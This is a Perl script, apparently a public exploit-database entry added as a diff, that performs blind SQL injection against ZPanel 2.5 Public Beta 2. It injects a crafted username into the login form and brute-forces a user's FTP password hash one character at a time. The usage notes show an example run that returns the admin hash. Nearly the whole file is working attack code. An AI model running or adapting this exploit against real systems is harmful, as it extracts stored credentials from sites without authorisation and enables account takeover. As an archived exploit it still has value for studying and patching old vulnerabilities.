@@ -1,0 +1,139 @@
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+
+# ZPanel Ver. 2.5- Public BETA 2 (Release date: 1/15/2005)
+# sql injection exploit with one char bruteforce
+# work on all mysql versions 
+
+# --------------------------------------------------------
+# example:
+# r57zpanel.pl http://192.168.0.1/zpanel/index.php admin
+# [~] PATH : http://192.168.0.1/zpanel/index.php
+# [~] USERNAME : admin
+# [~] SEARCHING PASSWORD ... [ DONE ]
+#
+# USER_NAME: admin
+#  FTP_PASS: 5f4dcc3b5aa765d61d8327deb882cf99
+# --------------------------------------------------------
+# bug found by foster
+# exploit coded by 1dt.w0lf
+# 02.04.05
+# http://ghc.ru
+# http://rst.void.ru
+
+$path     = $ARGV[0];
+$username = $ARGV[1];
+
+$s_num = 1;
+$|++;
+$n = 0;
+
+if (@ARGV < 2) { &usage; }
+print "[~] PATH : $path\r\n";
+print "[~] USERNAME : $username\r\n";
+print "[~] SEARCHING PASSWORD ... [|] [0]";
+
+while(1)
+{
+if(&found(47,58)==0) { &found(96,122); } 
+$char = $i;
+if ($char=="0") 
+ { 
+ if(length($allchar > 0)){
+ print "\b\b\b\b\b"."\b"x(length($n))." DONE ]     "; 
+ print qq{
+ USER_NAME: $username
+  FTP_PASS: $allchar
+ };
+ }
+ else
+ {
+ print "\b\b\b\b\b"."\b"x(length($n))." FAILED ]     ";
+ }
+ exit();  
+ }
+else 
+ {  
+ $allchar .= chr($char); 
+ }
+$s_num++;
+}
+
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ status();
+ $ccheck = $_[0];
+ $username2 = $username."' AND ascii(substring(ftppass,".$s_num.",1))".$ccheck." /*";
+ $mcb_reguest = LWP::UserAgent->new() or die;
+ $res = $mcb_reguest->post($path,
+ {
+ "uname"  => "$username2",
+ "passwd" => "RST&GHC",
+ "submit" => "Login"
+ }
+ ); 
+ @results = $res->content; 
+ 
+ foreach $result(@results)
+  {
+  if ($result =~ /Incorrect password/) { return 1; }
+  }
+ return 0;
+ }
+ 
+sub status()
+{
+  $status = $n % 5;
+  if($status==0){ print "\b\b\b\b\b"."\b"x(length($n-1))."/] [".$n."]";  }
+  if($status==1){ print "\b\b\b\b\b"."\b"x(length($n-1))."-] [".$n."]";  }
+  if($status==2){ print "\b\b\b\b\b"."\b"x(length($n-1))."\\] [".$n."]"; }
+  if($status==3){ print "\b\b\b\b\b"."\b"x(length($n-1))."|] [".$n."]";  }
+}
+
+sub usage()
+ {
+ print q(
+ r57zpanel.pl - ZPanel ver 2.5-public beta 2 sql inj exploit
+ -----------------------------------------------------------
+ usage: r57zpanel.pl [path] [username]
+ [path] - path to zpanel index
+ [username] - username for bruteforce 
+ e.g.
+ r57zpanel.pl http://192.168.0.1/zpanel/index.php admin
+ -----------------------------------------------------------
+ RST/GHC , http://rst.void.ru , http://ghc.ru
+ );
+ exit();
+ }
+
+
+# milw0rm.com [2005-05-17]
